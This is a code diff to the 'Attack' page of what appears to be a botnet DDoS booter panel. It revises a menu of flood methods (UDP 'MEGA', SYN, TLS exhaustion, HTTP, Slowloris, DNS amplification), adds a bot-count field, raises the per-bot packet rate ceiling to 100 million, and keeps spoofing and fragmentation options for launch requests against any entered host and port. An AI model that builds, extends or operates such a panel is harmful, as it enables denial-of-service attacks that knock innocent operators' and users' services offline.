@@ -11,25 +11,21 @@ interface Attack {
 }
 
 const METHODS = [
+  { id: 'MEGA', desc: 'UDP MEGA (max power)' },
   { id: 'UDP', desc: 'UDP flood' },
-  { id: 'TCP', desc: 'TCP connect' },
-  { id: 'HTTP', desc: 'HTTP flood' },
-  { id: 'SYN', desc: 'SYN raw' },
-  { id: 'ICMP', desc: 'ICMP echo' },
-  { id: 'MIX', desc: 'Mixed' },
-  { id: 'SLOWLORIS', desc: 'Slow headers' },
-  { id: 'TLS_EXHAUST', desc: 'TLS handshake' },
-  { id: 'DNS_AMP', desc: 'DNS amplify' },
-  { id: 'GAME_MIMIC', desc: 'Game protocol' },
-  { id: 'MEGA', desc: 'Full power' },
+  { id: 'SYN', desc: 'SYN flood' },
+  { id: 'TLS_EXHAUST', desc: 'TLS exhaust (2000 conns)' },
+  { id: 'HTTP', desc: 'HTTP/HTTPS flood' },
+  { id: 'SLOWLORIS', desc: 'Slowloris (512 conns)' },
+  { id: 'DNS_AMP', desc: 'DNS amplification' },
 ];
 
 export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
   const { toast } = useToast();
   const [attacks, setAttacks] = useState<Attack[]>([]);
   const [form, setForm] = useState({
-    target_host: '', target_port: 80, method: 'UDP', duration_secs: 60,
-    pps_per_bot: 100000, spoof_mode: 0, fragmentation: false, mega_mode: false,
+    target_host: '', target_port: 80, method: 'MEGA', duration_secs: 60,
+    pps_per_bot: 100000, bot_count: 1, spoof_mode: 0, fragmentation: false, mega_mode: false,
   });
   const [launching, setLaunching] = useState(false);
   const [err, setErr] = useState('');
@@ -58,11 +54,11 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
       const payload = {
         ...form,
         method: form.method,
+        bot_count: form.bot_count,
         mega_mode: form.method === 'MEGA' || form.mega_mode,
         slowloris: form.method === 'SLOWLORIS',
         tls_exhaust: form.method === 'TLS_EXHAUST',
         dns_amp: form.method === 'DNS_AMP',
-        game_mimic: form.method === 'GAME_MIMIC',
       };
       await api.post('/api/attacks/launch', payload);
       toast(`Attack launched → ${form.target_host}:${form.target_port}`, 'success');
@@ -108,7 +104,7 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
           <Crosshair className="w-4 h-4 text-red-400" />Launch Attack
         </h3>
 
-        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-4">
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4 mb-4">
           <div className="sm:col-span-2">
             <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Target Host</label>
             <div className="relative">
@@ -131,6 +127,10 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
               <Clock className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[var(--text-muted)]" />
               <input type="number" min={1} max={3600} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl pl-9 pr-3 py-2.5 text-xs" value={form.duration_secs} onChange={e => setForm(f => ({ ...f, duration_secs: parseInt(e.target.value) || 60 }))} />
             </div>
+          </div>
+          <div>
+            <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Bot Count</label>
+            <input type="number" min={1} max={100} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs font-mono" value={form.bot_count} onChange={e => setForm(f => ({ ...f, bot_count: parseInt(e.target.value) || 1 }))} />
           </div>
         </div>
 
@@ -158,7 +158,7 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-4">
           <div>
             <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">PPS / Bot</label>
-            <input type="number" min={1000} max={5000000} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs font-mono" value={form.pps_per_bot} onChange={e => setForm(f => ({ ...f, pps_per_bot: parseInt(e.target.value) || 100000 }))} />
+            <input type="number" min={1000} max={100000000} className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2.5 text-xs font-mono" value={form.pps_per_bot} onChange={e => setForm(f => ({ ...f, pps_per_bot: parseInt(e.target.value) || 100000 }))} />
           </div>
           <div>
             <label className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] block mb-1.5">Spoof</label>
